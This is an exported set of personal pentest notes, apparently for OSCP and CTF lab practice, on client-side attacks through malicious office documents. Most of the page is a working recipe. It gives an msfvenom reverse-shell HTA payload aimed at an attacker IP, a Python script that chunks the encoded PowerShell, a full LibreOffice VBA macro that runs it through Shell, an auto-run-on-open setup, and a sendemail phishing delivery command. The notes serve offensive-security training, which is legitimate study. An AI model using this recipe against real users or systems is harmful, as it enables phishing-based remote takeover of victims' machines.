<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Client Side Attacks</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Client Side Attacks</h1><br/><p><h1>Tips</h1><ul><li>For CTFs may only get 1 try for each filename. If it fails, shell dies, etc, need to use diff filenames or revert the machine.</li></ul></p><p></p><p><h1>Preperation</h1></p><p>[OSCP 73-77]</p><p></p><p><h1>Windows Library Files &amp; Windows Shorcut File</h1></p><p>For ex, can send payload via <a href="Recon_+_Services--Mail_Services--SMTP_26.html#Malicious Email">email over SMTP</a></p><p></p><p><h1>Malicious Excel File</h1></p><p>[OSCP 77-79]</p><p>May need <a href="https://stackoverflow.com/questions/23173694/is-it-possible-to-write-excel-vba-code-in-visual-studio">fancy customization</a> to use Visual Studio instead of Office</p><p></p><p><h2>Create with Visual Studio</h2><span style="color:#663e0e;"></span></p><p><span style="color:#663e0e;"></span><strong>File</strong> → <strong>New File</strong> &amp; <strong>File</strong> → <strong>Save as</strong> ↓ <strong>XSL</strong></p><p></p><p><h1>LibreOffice Macro</h1></p><p></p><p><h2>Create Payload</h2></p><p>Generate .hta file with your payload.</p><p></p><p><em>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.118.8 LPORT=443 -f hta-psh -o evil.hta</em></p><p></p><p>This file will contain an encoded PS payload (e.g<em> &quot;powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBT....QAcwApADsA&quot;</em>)</p><p></p><p><h3>Format Payload</h3></p><p>Prepend <strong>cmd.exe /C</strong> to the start of the payload.</p><p></p><p><strong>VBA</strong> has a 255-character limit for literal strings, but this restriction does not apply to strings stored in variables.</p><p></p><p>Need to transform this large string into smaller chunks like-</p><p></p><p><em>Str = Str + &quot;</em><em><strong>cmd.exe /C</strong></em><em> powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad&quot;</em><em></em></p><p><em>Str = Str + &quot;ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA&quot;</em></p><p>...</p><p></p><p>This can be automated with a Python script like-</p><p></p><p><em>s = &quot;</em><em><strong>cmd.exe /C</strong></em><em> powershell.exe -nop -w hidden -e aQBmA...CQAcwApADsA&quot;</em><em></em></p><p><em></em><em></em></p><p><em>n = 50</em><em></em></p><p><em>for i in range(0, len(s), n):</em><em></em></p><p><em>    chunk = s[i:i + n]</em><em></em></p><p><em>    print(&#39;Str = Str + &quot;&#39; + chunk + &#39;&quot;&#39;)</em></p><p>    </p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: Quotes around payload for variable <strong>s</strong> may not look like they affect the entire payload (i.e vim colors some of it purple &amp; the rest white). This can be ignored. It still works as intended.</p><p>    </p><p><h2>Create LibreOffice Macro</h2></p><p>For example, create a new <strong>.ods</strong> file in <strong>LibreOffice Calc</strong>, then <a href="https://books.libreoffice.org/en/GS70/GS7013-GettingStartedWithMacros.html">create a macro</a> in that file.</p><p></p><p><strong>Tools</strong> → <strong>Macros</strong> ↓ <strong>Organize Macros</strong> ↓ <strong>Basic</strong>. Select this document&#39;s name ↓  <strong>Standard</strong> then click <strong>New</strong>.</p><p></p><p></p><p>★<span style="color:#f66151;text-decoration:underline;">WARNING</span>★: Don&#39;t use- <strong>Tools</strong> → <strong>Macros</strong> ↓ <strong>Edit Macros</strong>. This will create a new macro locally, but it won&#39;t be a part of this current document!</p><p></p><p><em>Sub Exploit</em><em></em></p><p><em></em><em></em></p><p><em>   Dim Str As String</em><em></em></p><p><em></em><em></em></p><p><em>   Str = Str + &quot;cmd.exe /C powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad&quot;</em><em></em></p><p><em>   Str = Str + &quot;ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA&quot;</em><em></em></p><p><em>   Str = Str + &quot;AUwAyAEIAMABLAEEAQQBBAD0AJwAnACkAKQApACwAWwBTAHkAc&quot;</em><em></em></p><p><em>   Str = Str + &quot;wB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgA&quot;</em><em></em></p><p><em>   Str = Str + &quot;uAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6A&quot;</em><em></em></p><p><em>   ...</em><em></em></p><p><em>   Str = Str + &quot;EQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQ&quot;</em><em></em></p><p><em>   Str = Str + &quot;AbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZ&quot;</em><em></em></p><p><em>   Str = Str + &quot;QBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJAB&quot;</em><em></em></p><p><em>   Str = Str + &quot;zAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPA&quot;</em><em></em></p><p><em>   Str = Str + &quot;HUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQ&quot;</em><em></em></p><p><em>   Str = Str + &quot;AbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAc&quot;</em><em></em></p><p><em>   Str = Str + &quot;wAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAB&quot;</em><em></em></p><p><em>   Str = Str + &quot;yAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnA&quot;</em><em></em></p><p><em>   Str = Str + &quot;G4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFM&quot;</em><em></em></p><p><em>   Str = Str + &quot;AdABhAHIAdAAoACQAcwApADsA&quot;</em><em></em></p><p><em></em><em></em></p><p><em>   Shell(Str)</em><em></em></p><p><em></em><em></em></p><p><em>End Sub</em></p><p></p><p>Remember to <strong>File</strong> ↓ <strong>Save</strong>. Should now see this when you run <strong>Tools</strong> → <strong>Macros</strong> ↓ <strong>Edit Macros</strong>	from the main document again.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Do you need to hit <strong>Compile</strong> in Macro Editing menu?</p><p></p><p><h3>Indentation</h3></p><p>Each line of <strong>Str = Str +</strong>... should be indented in line with <strong>Dim Str As String</strong>. Instead of manually doing this, may be able to paste output of Python script into new file &amp; using command like-</p><p></p><p><em>sed -i ‘s/Str = Str/   Str = Str/g’ chunks.txt</em></p><p></p><p>Another option is to use LibreOffice&#39;s <strong>Find &amp; Replace</strong> (CTRL + H)</p><p></p><p><h3>Auto Run on Open</h3></p><p>From the main document- <strong>Tools</strong> ↓<strong> Customize</strong> →  <strong>Events</strong> ↓<strong> Open Document</strong> &amp; assign the macro as an event. Afterwards, make sure it&#39;s set to <strong>Save In </strong>this document &amp; click <strong>Ok</strong> at the bottom.</p><p></p><p><h2>Deliver</h2></p><p>Send email from known account to target recipient(s) using Host&#39;s SMTP server.</p><p></p><p><em>sendemail -f &#39;jonas@localhost&#39; -t &#39;mailadmin@localhost&#39; -s 192.168.230.140:25 -u &#39;Your spreadsheet&#39; -m &#39;Here is your requested spreadsheet&#39; -a phish.ods</em></p><p></p><p>Shoulkd get Output like-</p><p><strong>Apr 26 13:11:15 kali sendemail[741472]: Email was sent successfully!</strong></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: It can take awhile to be triggered (even for a CTF). Wait at least 5 minutes.</p></div>
</body>
</html>
